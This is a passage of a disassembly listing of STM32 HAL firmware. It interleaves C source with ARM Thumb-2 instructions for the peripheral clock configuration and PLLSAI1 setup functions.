    __HAL_RCC_USART1_CONFIG(PeriphClkInit->Usart1ClockSelection);
 800493e:	4b84      	ldr	r3, [pc, #528]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004940:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004944:	f023 0203 	bic.w	r2, r3, #3
 8004948:	687b      	ldr	r3, [r7, #4]
 800494a:	6a1b      	ldr	r3, [r3, #32]
 800494c:	4980      	ldr	r1, [pc, #512]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800494e:	4313      	orrs	r3, r2
 8004950:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- USART2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART2) == RCC_PERIPHCLK_USART2)
 8004954:	687b      	ldr	r3, [r7, #4]
 8004956:	681b      	ldr	r3, [r3, #0]
 8004958:	f003 0302 	and.w	r3, r3, #2
 800495c:	2b00      	cmp	r3, #0
 800495e:	d00a      	beq.n	8004976 <HAL_RCCEx_PeriphCLKConfig+0x20e>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART2CLKSOURCE(PeriphClkInit->Usart2ClockSelection));

    /* Configure the USART2 clock source */
    __HAL_RCC_USART2_CONFIG(PeriphClkInit->Usart2ClockSelection);
 8004960:	4b7b      	ldr	r3, [pc, #492]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004962:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004966:	f023 020c 	bic.w	r2, r3, #12
 800496a:	687b      	ldr	r3, [r7, #4]
 800496c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 800496e:	4978      	ldr	r1, [pc, #480]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004970:	4313      	orrs	r3, r2
 8004972:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* UART5 */

  /*-------------------------- LPUART1 clock source configuration ------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPUART1) == RCC_PERIPHCLK_LPUART1)
 8004976:	687b      	ldr	r3, [r7, #4]
 8004978:	681b      	ldr	r3, [r3, #0]
 800497a:	f003 0320 	and.w	r3, r3, #32
 800497e:	2b00      	cmp	r3, #0
 8004980:	d00a      	beq.n	8004998 <HAL_RCCEx_PeriphCLKConfig+0x230>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LPUART1CLKSOURCE(PeriphClkInit->Lpuart1ClockSelection));

    /* Configure the LPUART1 clock source */
    __HAL_RCC_LPUART1_CONFIG(PeriphClkInit->Lpuart1ClockSelection);
 8004982:	4b73      	ldr	r3, [pc, #460]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004984:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004988:	f423 6240 	bic.w	r2, r3, #3072	; 0xc00
 800498c:	687b      	ldr	r3, [r7, #4]
 800498e:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004990:	496f      	ldr	r1, [pc, #444]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004992:	4313      	orrs	r3, r2
 8004994:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM1) == (RCC_PERIPHCLK_LPTIM1))
 8004998:	687b      	ldr	r3, [r7, #4]
 800499a:	681b      	ldr	r3, [r3, #0]
 800499c:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80049a0:	2b00      	cmp	r3, #0
 80049a2:	d00a      	beq.n	80049ba <HAL_RCCEx_PeriphCLKConfig+0x252>
  {
    assert_param(IS_RCC_LPTIM1CLK(PeriphClkInit->Lptim1ClockSelection));
    __HAL_RCC_LPTIM1_CONFIG(PeriphClkInit->Lptim1ClockSelection);
 80049a4:	4b6a      	ldr	r3, [pc, #424]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049a6:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80049aa:	f423 2240 	bic.w	r2, r3, #786432	; 0xc0000
 80049ae:	687b      	ldr	r3, [r7, #4]
 80049b0:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 80049b2:	4967      	ldr	r1, [pc, #412]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049b4:	4313      	orrs	r3, r2
 80049b6:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM2) == (RCC_PERIPHCLK_LPTIM2))
 80049ba:	687b      	ldr	r3, [r7, #4]
 80049bc:	681b      	ldr	r3, [r3, #0]
 80049be:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80049c2:	2b00      	cmp	r3, #0
 80049c4:	d00a      	beq.n	80049dc <HAL_RCCEx_PeriphCLKConfig+0x274>
  {
    assert_param(IS_RCC_LPTIM2CLK(PeriphClkInit->Lptim2ClockSelection));
    __HAL_RCC_LPTIM2_CONFIG(PeriphClkInit->Lptim2ClockSelection);
 80049c6:	4b62      	ldr	r3, [pc, #392]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049c8:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80049cc:	f423 1240 	bic.w	r2, r3, #3145728	; 0x300000
 80049d0:	687b      	ldr	r3, [r7, #4]
 80049d2:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 80049d4:	495e      	ldr	r1, [pc, #376]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049d6:	4313      	orrs	r3, r2
 80049d8:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- I2C1 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C1) == RCC_PERIPHCLK_I2C1)
 80049dc:	687b      	ldr	r3, [r7, #4]
 80049de:	681b      	ldr	r3, [r3, #0]
 80049e0:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80049e4:	2b00      	cmp	r3, #0
 80049e6:	d00a      	beq.n	80049fe <HAL_RCCEx_PeriphCLKConfig+0x296>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C1CLKSOURCE(PeriphClkInit->I2c1ClockSelection));

    /* Configure the I2C1 clock source */
    __HAL_RCC_I2C1_CONFIG(PeriphClkInit->I2c1ClockSelection);
 80049e8:	4b59      	ldr	r3, [pc, #356]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049ea:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80049ee:	f423 5240 	bic.w	r2, r3, #12288	; 0x3000
 80049f2:	687b      	ldr	r3, [r7, #4]
 80049f4:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80049f6:	4956      	ldr	r1, [pc, #344]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049f8:	4313      	orrs	r3, r2
 80049fa:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* I2C2 */

  /*-------------------------- I2C3 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C3) == RCC_PERIPHCLK_I2C3)
 80049fe:	687b      	ldr	r3, [r7, #4]
 8004a00:	681b      	ldr	r3, [r3, #0]
 8004a02:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004a06:	2b00      	cmp	r3, #0
 8004a08:	d00a      	beq.n	8004a20 <HAL_RCCEx_PeriphCLKConfig+0x2b8>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C3CLKSOURCE(PeriphClkInit->I2c3ClockSelection));

    /* Configure the I2C3 clock source */
    __HAL_RCC_I2C3_CONFIG(PeriphClkInit->I2c3ClockSelection);
 8004a0a:	4b51      	ldr	r3, [pc, #324]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a0c:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004a10:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 8004a14:	687b      	ldr	r3, [r7, #4]
 8004a16:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8004a18:	494d      	ldr	r1, [pc, #308]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a1a:	4313      	orrs	r3, r2
 8004a1c:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
#endif /* I2C4 */

#if defined(USB_OTG_FS) || defined(USB)

  /*-------------------------- USB clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USB) == (RCC_PERIPHCLK_USB))
 8004a20:	687b      	ldr	r3, [r7, #4]
 8004a22:	681b      	ldr	r3, [r3, #0]
 8004a24:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8004a28:	2b00      	cmp	r3, #0
 8004a2a:	d028      	beq.n	8004a7e <HAL_RCCEx_PeriphCLKConfig+0x316>
  {
    assert_param(IS_RCC_USBCLKSOURCE(PeriphClkInit->UsbClockSelection));
    __HAL_RCC_USB_CONFIG(PeriphClkInit->UsbClockSelection);
 8004a2c:	4b48      	ldr	r3, [pc, #288]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a2e:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004a32:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 8004a36:	687b      	ldr	r3, [r7, #4]
 8004a38:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004a3a:	4945      	ldr	r1, [pc, #276]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a3c:	4313      	orrs	r3, r2
 8004a3e:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLL)
 8004a42:	687b      	ldr	r3, [r7, #4]
 8004a44:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004a46:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004a4a:	d106      	bne.n	8004a5a <HAL_RCCEx_PeriphCLKConfig+0x2f2>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004a4c:	4b40      	ldr	r3, [pc, #256]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a4e:	68db      	ldr	r3, [r3, #12]
 8004a50:	4a3f      	ldr	r2, [pc, #252]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a52:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 8004a56:	60d3      	str	r3, [r2, #12]
 8004a58:	e011      	b.n	8004a7e <HAL_RCCEx_PeriphCLKConfig+0x316>
    }
    else
    {
#if defined(RCC_PLLSAI1_SUPPORT)
      if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLLSAI1)
 8004a5a:	687b      	ldr	r3, [r7, #4]
 8004a5c:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004a5e:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 8004a62:	d10c      	bne.n	8004a7e <HAL_RCCEx_PeriphCLKConfig+0x316>
      {
        /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
        ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 8004a64:	687b      	ldr	r3, [r7, #4]
 8004a66:	3304      	adds	r3, #4
 8004a68:	2101      	movs	r1, #1
 8004a6a:	4618      	mov	r0, r3
 8004a6c:	f000 f882 	bl	8004b74 <RCCEx_PLLSAI1_Config>
 8004a70:	4603      	mov	r3, r0
 8004a72:	74fb      	strb	r3, [r7, #19]

        if(ret != HAL_OK)
 8004a74:	7cfb      	ldrb	r3, [r7, #19]
 8004a76:	2b00      	cmp	r3, #0
 8004a78:	d001      	beq.n	8004a7e <HAL_RCCEx_PeriphCLKConfig+0x316>
        {
          /* set overall return value */
          status = ret;
 8004a7a:	7cfb      	ldrb	r3, [r7, #19]
 8004a7c:	74bb      	strb	r3, [r7, #18]
  }

#endif /* SDMMC1 */

  /*-------------------------- RNG clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_RNG) == (RCC_PERIPHCLK_RNG))
 8004a7e:	687b      	ldr	r3, [r7, #4]
 8004a80:	681b      	ldr	r3, [r3, #0]
 8004a82:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004a86:	2b00      	cmp	r3, #0
 8004a88:	d028      	beq.n	8004adc <HAL_RCCEx_PeriphCLKConfig+0x374>
  {
    assert_param(IS_RCC_RNGCLKSOURCE(PeriphClkInit->RngClockSelection));
    __HAL_RCC_RNG_CONFIG(PeriphClkInit->RngClockSelection);
 8004a8a:	4b31      	ldr	r3, [pc, #196]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a8c:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004a90:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 8004a94:	687b      	ldr	r3, [r7, #4]
 8004a96:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004a98:	492d      	ldr	r1, [pc, #180]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a9a:	4313      	orrs	r3, r2
 8004a9c:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLL)
 8004aa0:	687b      	ldr	r3, [r7, #4]
 8004aa2:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004aa4:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004aa8:	d106      	bne.n	8004ab8 <HAL_RCCEx_PeriphCLKConfig+0x350>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004aaa:	4b29      	ldr	r3, [pc, #164]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004aac:	68db      	ldr	r3, [r3, #12]
 8004aae:	4a28      	ldr	r2, [pc, #160]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004ab0:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 8004ab4:	60d3      	str	r3, [r2, #12]
 8004ab6:	e011      	b.n	8004adc <HAL_RCCEx_PeriphCLKConfig+0x374>
    }
#if defined(RCC_PLLSAI1_SUPPORT)
    else if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLLSAI1)
 8004ab8:	687b      	ldr	r3, [r7, #4]
 8004aba:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004abc:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 8004ac0:	d10c      	bne.n	8004adc <HAL_RCCEx_PeriphCLKConfig+0x374>
    {
      /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 8004ac2:	687b      	ldr	r3, [r7, #4]
 8004ac4:	3304      	adds	r3, #4
 8004ac6:	2101      	movs	r1, #1
 8004ac8:	4618      	mov	r0, r3
 8004aca:	f000 f853 	bl	8004b74 <RCCEx_PLLSAI1_Config>
 8004ace:	4603      	mov	r3, r0
 8004ad0:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 8004ad2:	7cfb      	ldrb	r3, [r7, #19]
 8004ad4:	2b00      	cmp	r3, #0
 8004ad6:	d001      	beq.n	8004adc <HAL_RCCEx_PeriphCLKConfig+0x374>
      {
        /* set overall return value */
        status = ret;
 8004ad8:	7cfb      	ldrb	r3, [r7, #19]
 8004ada:	74bb      	strb	r3, [r7, #18]
    }
  }

  /*-------------------------- ADC clock source configuration ----------------------*/
#if !defined(STM32L412xx) && !defined(STM32L422xx)
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_ADC) == RCC_PERIPHCLK_ADC)
 8004adc:	687b      	ldr	r3, [r7, #4]
 8004ade:	681b      	ldr	r3, [r3, #0]
 8004ae0:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8004ae4:	2b00      	cmp	r3, #0
 8004ae6:	d01c      	beq.n	8004b22 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
  {
    /* Check the parameters */
    assert_param(IS_RCC_ADCCLKSOURCE(PeriphClkInit->AdcClockSelection));

    /* Configure the ADC interface clock source */
    __HAL_RCC_ADC_CONFIG(PeriphClkInit->AdcClockSelection);
 8004ae8:	4b19      	ldr	r3, [pc, #100]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004aea:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004aee:	f023 5240 	bic.w	r2, r3, #805306368	; 0x30000000
 8004af2:	687b      	ldr	r3, [r7, #4]
 8004af4:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 8004af6:	4916      	ldr	r1, [pc, #88]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004af8:	4313      	orrs	r3, r2
 8004afa:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

#if defined(RCC_PLLSAI1_SUPPORT)
    if(PeriphClkInit->AdcClockSelection == RCC_ADCCLKSOURCE_PLLSAI1)
 8004afe:	687b      	ldr	r3, [r7, #4]
 8004b00:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 8004b02:	f1b3 5f80 	cmp.w	r3, #268435456	; 0x10000000
 8004b06:	d10c      	bne.n	8004b22 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
    {
      /* PLLSAI1 input clock, parameters M, N & R configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_R_UPDATE);
 8004b08:	687b      	ldr	r3, [r7, #4]
 8004b0a:	3304      	adds	r3, #4
 8004b0c:	2102      	movs	r1, #2
 8004b0e:	4618      	mov	r0, r3
 8004b10:	f000 f830 	bl	8004b74 <RCCEx_PLLSAI1_Config>
 8004b14:	4603      	mov	r3, r0
 8004b16:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 8004b18:	7cfb      	ldrb	r3, [r7, #19]
 8004b1a:	2b00      	cmp	r3, #0
 8004b1c:	d001      	beq.n	8004b22 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
      {
        /* set overall return value */
        status = ret;
 8004b1e:	7cfb      	ldrb	r3, [r7, #19]
 8004b20:	74bb      	strb	r3, [r7, #18]
#endif /* !STM32L412xx && !STM32L422xx */

#if defined(SWPMI1)

  /*-------------------------- SWPMI1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SWPMI1) == RCC_PERIPHCLK_SWPMI1)
 8004b22:	687b      	ldr	r3, [r7, #4]
 8004b24:	681b      	ldr	r3, [r3, #0]
 8004b26:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8004b2a:	2b00      	cmp	r3, #0
 8004b2c:	d00a      	beq.n	8004b44 <HAL_RCCEx_PeriphCLKConfig+0x3dc>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SWPMI1CLKSOURCE(PeriphClkInit->Swpmi1ClockSelection));

    /* Configure the SWPMI1 clock source */
    __HAL_RCC_SWPMI1_CONFIG(PeriphClkInit->Swpmi1ClockSelection);
 8004b2e:	4b08      	ldr	r3, [pc, #32]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004b30:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004b34:	f023 4280 	bic.w	r2, r3, #1073741824	; 0x40000000
 8004b38:	687b      	ldr	r3, [r7, #4]
 8004b3a:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8004b3c:	4904      	ldr	r1, [pc, #16]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004b3e:	4313      	orrs	r3, r2
 8004b40:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
    }
  }

#endif /* OCTOSPI1 || OCTOSPI2 */

  return status;
 8004b44:	7cbb      	ldrb	r3, [r7, #18]
}
 8004b46:	4618      	mov	r0, r3
 8004b48:	3718      	adds	r7, #24
 8004b4a:	46bd      	mov	sp, r7
 8004b4c:	bd80      	pop	{r7, pc}
 8004b4e:	bf00      	nop
 8004b50:	40021000 	.word	0x40021000

08004b54 <HAL_RCCEx_EnableMSIPLLMode>:
  * @note   Prior to enable the PLL-mode of the MSI for automatic hardware
  *         calibration LSE oscillator is to be enabled with HAL_RCC_OscConfig().
  * @retval None
  */
void HAL_RCCEx_EnableMSIPLLMode(void)
{
 8004b54:	b480      	push	{r7}
 8004b56:	af00      	add	r7, sp, #0
  SET_BIT(RCC->CR, RCC_CR_MSIPLLEN) ;
 8004b58:	4b05      	ldr	r3, [pc, #20]	; (8004b70 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004b5a:	681b      	ldr	r3, [r3, #0]
 8004b5c:	4a04      	ldr	r2, [pc, #16]	; (8004b70 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004b5e:	f043 0304 	orr.w	r3, r3, #4
 8004b62:	6013      	str	r3, [r2, #0]
}
 8004b64:	bf00      	nop
 8004b66:	46bd      	mov	sp, r7
 8004b68:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004b6c:	4770      	bx	lr
 8004b6e:	bf00      	nop
 8004b70:	40021000 	.word	0x40021000

08004b74 <RCCEx_PLLSAI1_Config>:
  * @note   PLLSAI1 is temporary disable to apply new parameters
  *
  * @retval HAL status
  */
static HAL_StatusTypeDef RCCEx_PLLSAI1_Config(RCC_PLLSAI1InitTypeDef *PllSai1, uint32_t Divider)
{
 8004b74:	b580      	push	{r7, lr}
 8004b76:	b084      	sub	sp, #16
 8004b78:	af00      	add	r7, sp, #0
 8004b7a:	6078      	str	r0, [r7, #4]
 8004b7c:	6039      	str	r1, [r7, #0]
  uint32_t tickstart;
  HAL_StatusTypeDef status = HAL_OK;
 8004b7e:	2300      	movs	r3, #0
 8004b80:	73fb      	strb	r3, [r7, #15]
  assert_param(IS_RCC_PLLSAI1M_VALUE(PllSai1->PLLSAI1M));
  assert_param(IS_RCC_PLLSAI1N_VALUE(PllSai1->PLLSAI1N));
  assert_param(IS_RCC_PLLSAI1CLOCKOUT_VALUE(PllSai1->PLLSAI1ClockOut));

  /* Check that PLLSAI1 clock source and divider M can be applied */
  if(__HAL_RCC_GET_PLL_OSCSOURCE() != RCC_PLLSOURCE_NONE)
 8004b82:	4b74      	ldr	r3, [pc, #464]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b84:	68db      	ldr	r3, [r3, #12]
 8004b86:	f003 0303 	and.w	r3, r3, #3
 8004b8a:	2b00      	cmp	r3, #0
 8004b8c:	d018      	beq.n	8004bc0 <RCCEx_PLLSAI1_Config+0x4c>
  {
    /* PLL clock source and divider M already set, check that no request for change  */
    if((__HAL_RCC_GET_PLL_OSCSOURCE() != PllSai1->PLLSAI1Source)
 8004b8e:	4b71      	ldr	r3, [pc, #452]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b90:	68db      	ldr	r3, [r3, #12]
 8004b92:	f003 0203 	and.w	r2, r3, #3
 8004b96:	687b      	ldr	r3, [r7, #4]
 8004b98:	681b      	ldr	r3, [r3, #0]
 8004b9a:	429a      	cmp	r2, r3
 8004b9c:	d10d      	bne.n	8004bba <RCCEx_PLLSAI1_Config+0x46>
       ||
       (PllSai1->PLLSAI1Source == RCC_PLLSOURCE_NONE)
 8004b9e:	687b      	ldr	r3, [r7, #4]
 8004ba0:	681b      	ldr	r3, [r3, #0]
       ||
 8004ba2:	2b00      	cmp	r3, #0
 8004ba4:	d009      	beq.n	8004bba <RCCEx_PLLSAI1_Config+0x46>
#if !defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
       ||
       (((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U) != PllSai1->PLLSAI1M)
 8004ba6:	4b6b      	ldr	r3, [pc, #428]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ba8:	68db      	ldr	r3, [r3, #12]
 8004baa:	091b      	lsrs	r3, r3, #4
 8004bac:	f003 0307 	and.w	r3, r3, #7
 8004bb0:	1c5a      	adds	r2, r3, #1
 8004bb2:	687b      	ldr	r3, [r7, #4]
 8004bb4:	685b      	ldr	r3, [r3, #4]
       ||
 8004bb6:	429a      	cmp	r2, r3
 8004bb8:	d047      	beq.n	8004c4a <RCCEx_PLLSAI1_Config+0xd6>
#endif
      )
    {
      status = HAL_ERROR;
 8004bba:	2301      	movs	r3, #1
 8004bbc:	73fb      	strb	r3, [r7, #15]
 8004bbe:	e044      	b.n	8004c4a <RCCEx_PLLSAI1_Config+0xd6>
    }
  }
  else
  {
    /* Check PLLSAI1 clock source availability */
    switch(PllSai1->PLLSAI1Source)
 8004bc0:	687b      	ldr	r3, [r7, #4]
 8004bc2:	681b      	ldr	r3, [r3, #0]
 8004bc4:	2b03      	cmp	r3, #3
 8004bc6:	d018      	beq.n	8004bfa <RCCEx_PLLSAI1_Config+0x86>
 8004bc8:	2b03      	cmp	r3, #3
 8004bca:	d825      	bhi.n	8004c18 <RCCEx_PLLSAI1_Config+0xa4>
 8004bcc:	2b01      	cmp	r3, #1
 8004bce:	d002      	beq.n	8004bd6 <RCCEx_PLLSAI1_Config+0x62>
 8004bd0:	2b02      	cmp	r3, #2
 8004bd2:	d009      	beq.n	8004be8 <RCCEx_PLLSAI1_Config+0x74>
 8004bd4:	e020      	b.n	8004c18 <RCCEx_PLLSAI1_Config+0xa4>
    {
    case RCC_PLLSOURCE_MSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_MSIRDY))
 8004bd6:	4b5f      	ldr	r3, [pc, #380]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bd8:	681b      	ldr	r3, [r3, #0]
 8004bda:	f003 0302 	and.w	r3, r3, #2
 8004bde:	2b00      	cmp	r3, #0
 8004be0:	d11d      	bne.n	8004c1e <RCCEx_PLLSAI1_Config+0xaa>
      {
        status = HAL_ERROR;
 8004be2:	2301      	movs	r3, #1
 8004be4:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004be6:	e01a      	b.n	8004c1e <RCCEx_PLLSAI1_Config+0xaa>
    case RCC_PLLSOURCE_HSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSIRDY))
 8004be8:	4b5a      	ldr	r3, [pc, #360]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bea:	681b      	ldr	r3, [r3, #0]
 8004bec:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004bf0:	2b00      	cmp	r3, #0
 8004bf2:	d116      	bne.n	8004c22 <RCCEx_PLLSAI1_Config+0xae>
      {
        status = HAL_ERROR;
 8004bf4:	2301      	movs	r3, #1
 8004bf6:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004bf8:	e013      	b.n	8004c22 <RCCEx_PLLSAI1_Config+0xae>
    case RCC_PLLSOURCE_HSE:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSERDY))
 8004bfa:	4b56      	ldr	r3, [pc, #344]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bfc:	681b      	ldr	r3, [r3, #0]
 8004bfe:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004c02:	2b00      	cmp	r3, #0
 8004c04:	d10f      	bne.n	8004c26 <RCCEx_PLLSAI1_Config+0xb2>
      {
        if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSEBYP))
 8004c06:	4b53      	ldr	r3, [pc, #332]	; (8004d54 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c08:	681b      	ldr	r3, [r3, #0]
 8004c0a:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004c0e:	2b00      	cmp	r3, #0
 8004c10:	d109      	bne.n	8004c26 <RCCEx_PLLSAI1_Config+0xb2>
        {
          status = HAL_ERROR;
 8004c12:	2301      	movs	r3, #1
 8004c14:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 8004c16:	e006      	b.n	8004c26 <RCCEx_PLLSAI1_Config+0xb2>
    default:
      status = HAL_ERROR;
 8004c18:	2301      	movs	r3, #1
 8004c1a:	73fb      	strb	r3, [r7, #15]
      break;
 8004c1c:	e004      	b.n	8004c28 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004c1e:	bf00      	nop
 8004c20:	e002      	b.n	8004c28 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004c22:	bf00      	nop
 8004c24:	e000      	b.n	8004c28 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004c26:	bf00      	nop
    }

    if(status == HAL_OK)
 8004c28:	7bfb      	ldrb	r3, [r7, #15]
 8004c2a:	2b00      	cmp	r3, #0
 8004c2c:	d10d      	bne.n	8004c4a <RCCEx_PLLSAI1_Config+0xd6>
